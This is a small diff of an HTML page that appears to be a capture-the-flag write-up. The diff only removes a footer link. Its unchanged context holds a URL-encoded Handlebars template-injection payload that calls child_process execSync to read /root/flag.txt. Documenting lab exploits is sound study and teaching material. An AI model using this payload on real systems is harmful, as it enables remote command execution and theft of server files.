@@ -39,7 +39,6 @@
 <p>%7B%7B#with%20%22s%22%20as%20%7Cstring%7C%7D%7D%0A%20%20%7B%7B#with%20%22e%22%7D%7D%0A%20%20%20%20%7B%7B#with%20split%20as%20%7Cconslist%7C%7D%7D%0A%20%20%20%20%20%20%7B%7Bthis.pop%7D%7D%0A%20%20%20%20%20%20%7B%7Bthis.push%20(lookup%20string.sub%20%22constructor%22)%7D%7D%0A%20%20%20%20%20%20%7B%7Bthis.pop%7D%7D%0A%20%20%20%20%20%20%7B%7B#with%20string.split%20as%20%7Ccodelist%7C%7D%7D%0A%20%20%20%20%20%20%20%20%7B%7Bthis.pop%7D%7D%0A%20%20%20%20%20%20%20%20%7B%7Bthis.push%20%22return%20process.mainModule.require('child_process').execSync('cat%20/root/flag.txt');%22%7D%7D%0A%20%20%20%20%20%20%20%20%7B%7Bthis.pop%7D%7D%0A%20%20%20%20%20%20%20%20%7B%7B#each%20conslist%7D%7D%0A%20%20%20%20%20%20%20%20%20%20%7B%7B#with%20(string.sub.apply%200%20codelist)%7D%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7B%7Bthis%7D%7D%0A%20%20%20%20%20%20%20%20%20%20%7B%7B/with%7D%7D%0A%20%20%20%20%20%20%20%20%7B%7B/each%7D%7D%0A%20%20%20%20%20%20%7B%7B/with%7D%7D%0A%20%20%20%20%7B%7B/with%7D%7D%0A%20%20%7B%7B/with%7D%7D%0A%7B%7B/with%7D%7D</p>
 <p class="figure"><a class="img-link" href="bike/untitled-8.png"><img src="bike/untitled-8.png" alt="Untitled" loading="lazy"></a></p>
   </article>
-  <footer class="foot"><a href="https://github.com/the-grizzly-bear">github.com/the-grizzly-bear</a></footer>
 </main>
 </body>
 </html>
